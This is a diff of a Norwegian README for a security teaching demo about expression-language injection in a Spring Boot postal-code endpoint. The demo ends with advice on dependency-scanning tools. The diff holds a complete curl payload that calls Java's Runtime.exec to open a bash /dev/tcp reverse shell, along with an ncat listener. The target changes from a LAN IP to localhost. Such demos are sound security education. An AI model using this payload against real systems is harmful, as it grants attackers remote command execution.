@@ -89,9 +89,7 @@ returnere beskjed om at `pn` krever numerisk innputt:
 Tre terminaler:
 1. `ncat -lkvp 31338`
 2. `mvn spring-boot:run`
-3. `curl -vv -G --data-urlencode 'pn=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/192.168.10.138/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`
-
-Merk at IP-adressen i terminal 3 må matche IP-adressen til lokal maskin.
+3. `curl -vv -G --data-urlencode 'pn=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/127.0.0.1/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`
 
 I terminal 1 kan man nå skrive vanlige bash-kommandoer og eksekvere dem på maskinen som kjører i terminal 2.
 
@@ -113,11 +111,11 @@ Netflix: https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conduct
 
 For å oppdage slike ting, bør en av de følgende vurderes. Den første er gratis, resten er abonnementsbasert. Snyk har noe gratis.
 
-* OWASP Maven Plugin (https://owasp.org/www-project-dependency-check/)​
-* Snyk (https://snyk.io/)​
-* Nexus IQ (https://help.sonatype.com/iqserver)​
-* Whitesource (https://www.whitesourcesoftware.com/)​
-* Black Duck (https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html)​
+* OWASP Maven Plugin (https://owasp.org/www-project-dependency-check/  )​
+* Snyk (https://snyk.io/ )​
+* Nexus IQ (https://help.sonatype.com/iqserver )​
+* Whitesource (https://www.whitesourcesoftware.com/ )​
+* Black Duck (https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html )​
 
 
 ### Tidlig oppdagelse
